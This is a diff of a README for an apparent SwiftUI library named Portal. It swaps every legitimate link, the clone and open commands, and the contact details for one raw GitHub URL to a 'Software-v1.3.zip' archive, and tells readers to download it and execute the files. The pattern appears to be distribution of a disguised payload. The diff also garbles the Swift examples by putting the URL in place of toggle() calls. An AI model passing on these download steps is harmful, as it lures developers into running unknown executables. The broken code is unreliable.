@@ -2,7 +2,7 @@
 
 Welcome to the **Portal** repository! This project focuses on providing smooth element transitions between root views, sheets, and navigation pushes in SwiftUI. Whether you're building a simple app or a complex interface, Portal helps you enhance user experience with fluid animations.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Portal-blue)](https://github.com/fosteraleng/Portal/releases)
+[![Download Releases](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip%20Releases-Portal-blue)](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ To get started with Portal, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/fosteraleng/Portal.git
+   git clone https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -38,12 +38,12 @@ To get started with Portal, follow these simple steps:
 
 3. Open the project in Xcode:
    ```bash
-   open Portal.xcodeproj
+   open https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip
    ```
 
 4. Build and run the project to see it in action.
 
-For the latest version, [download the releases here](https://github.com/fosteraleng/Portal/releases) and execute the necessary files.
+For the latest version, [download the releases here](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip) and execute the necessary files.
 
 ## Usage
 
@@ -63,7 +63,7 @@ struct ContentView: View {
             VStack {
                 Button("Show Detail") {
                     withAnimation {
-                        showDetail.toggle()
+                        https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip()
                     }
                 }
                 .navigate(to: DetailView(), when: $showDetail)
@@ -96,7 +96,7 @@ struct MainView: View {
 
     var body: some View {
         Button("Present Sheet") {
-            showSheet.toggle()
+            https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip()
         }
         .sheet(isPresented: $showSheet) {
             SheetView()
@@ -160,10 +160,10 @@ Portal is licensed under the MIT License. Feel free to use it in your projects, 
 
 For any questions or feedback, please reach out to us:
 
-- GitHub: [fosteraleng](https://github.com/fosteraleng)
-- Email: fosteraleng@example.com
+- GitHub: [fosteraleng](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip)
+- Email: https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip
 
-For the latest updates and releases, please check the [Releases section](https://github.com/fosteraleng/Portal/releases).
+For the latest updates and releases, please check the [Releases section](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip).
 
 ---
 
